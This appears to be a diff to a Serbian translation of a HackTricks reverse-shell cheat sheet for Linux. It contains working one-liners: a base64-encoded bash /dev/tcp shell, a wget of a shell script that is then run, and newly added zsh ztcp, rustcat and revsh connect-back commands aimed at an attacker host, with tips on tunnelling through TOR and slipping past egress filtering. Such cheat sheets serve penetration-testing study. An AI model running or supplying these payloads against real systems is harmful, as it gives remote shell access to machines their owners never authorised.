@@ -36,11 +36,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: Ovaj deo komande pokreće interaktivni (`-i`) Bash shell.
 2. **`>&`**: Ovaj deo komande je skraćena notacija za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **istu destinaciju**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP vezu sa navedenom IP adresom i portom**.
-- Preusmeravanjem izlaza i tokova grešaka na ovaj fajl, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
+3. **`/dev/tcp/<NAPADAČ-IP>/<PORT>`**: Ovo je posebna datoteka koja **predstavlja TCP vezu sa navedenom IP adresom i portom**.
+- Preusmeravanjem izlaza i grešaka na ovu datoteku, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
 4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao standardni izlaz (`stdout`)**.
 
-### Kreiraj u fajlu i izvrši
+### Kreiraj u datoteci i izvrši
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
@@ -75,11 +75,11 @@ response.raise_for_status()
 
 return response.text
 ```
-I onda možete pokrenuti:
+А онда, можете покренути:
 ```shell
 toboggan -m nix.py -i
 ```
-Da direktno iskoristite interaktivnu ljusku. Možete dodati `-b` za Burpsuite integraciju i ukloniti `-i` za osnovniji rce omotač.
+Da biste direktno iskoristili interaktivnu ljusku. Možete dodati `-b` za Burpsuite integraciju i ukloniti `-i` za osnovniji rce omotač.
 
 Druga mogućnost je korišćenje `IppSec` forward shell implementacije [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (ugrađena TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderan netcat-sličan slušalac napisan u Rust-u (pakovan u Kali od 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Features:
+- Opcioni `--ssl` flag za enkriptovani transport (TLS 1.3)
+- `-s` za pokretanje bilo kog binarnog fajla (npr. `/bin/sh`, `python3`) na žrtvi
+- `--up` za automatsko unapređenje na potpuno interaktivni PTY
+
+## revsh (enkriptovan & spreman za pivotiranje)
+
+`revsh` je mali C klijent/server koji pruža pun TTY preko **enkriptovanog Diffie-Hellman tunela** i može opcionalno da priključi **TUN/TAP** interfejs za obrnuto VPN-pivotiranje.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Korisne zastavice:
+- `-b` : bind-shell umesto reverse
+- `-p socks5://127.0.0.1:9050` : proxy kroz TOR/HTTP/SOCKS
+- `-t` : kreiraj TUN interfejs (reverse VPN)
+
+Pošto je cela sesija enkriptovana i multiplexovana, često zaobilazi jednostavno egress filtriranje koje bi ubilo plain-text `/dev/tcp` shell.
+
 ## OpenSSL
 
 Napadač (Kali)
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
